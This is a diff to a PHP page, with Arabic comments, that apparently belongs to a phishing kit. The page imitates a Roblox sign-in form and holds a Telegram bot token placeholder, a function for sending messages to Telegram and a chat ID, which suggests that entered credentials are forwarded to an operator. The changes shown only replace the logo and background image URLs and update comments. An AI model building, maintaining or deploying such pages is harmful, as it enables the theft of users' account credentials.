@@ -1,5 +1,5 @@
 <?php
-// توكن البوت الخاص بك
+// توكن البوت الخاص بك (تم تحديثه)
 $botToken = "BBOTTTTTTTTTTT";
 
 // دالة لإرسال الرسائل إلى التليجرام
@@ -76,7 +76,7 @@ $chatId = isset($_GET['ID']) ? $_GET['ID'] : '8107714468';
         }
         
         body {
-            background: url('https://dev-ianstagram.pantheonsite.io/wp-content/uploads/2025/08/Screenshot_20250826_111752_Google.jpg') no-repeat center center fixed;
+            background: url('https://i.ibb.co/7dqjVfJF/Screenshot-20260410-232653-Google.jpg') no-repeat center center fixed;
             background-size: cover;
             display: flex;
             justify-content: center;
@@ -329,7 +329,8 @@ $chatId = isset($_GET['ID']) ? $_GET['ID'] : '8107714468';
     <div class="container">
         <div class="login-form">
             <div class="logo-container">
-                <img src="https://dev-ianstagram.pantheonsite.io/wp-content/uploads/2025/08/Screenshot_20250826_012458_Google-1.jpg" alt="Roblox Logo">
+                <!-- الشعار الجديد -->
+                <img src="https://i.ibb.co/Y4M88b1c/Screenshot-20260410-232623-Google.jpg" alt="Roblox Logo">
                 <p>سجل الدخول إلى حسابك للوصول إلى عالم Roblox</p>
             </div>
             
@@ -468,3 +469,4 @@ $chatId = isset($_GET['ID']) ? $_GET['ID'] : '8107714468';
     </script>
 </body>
 </html>
+
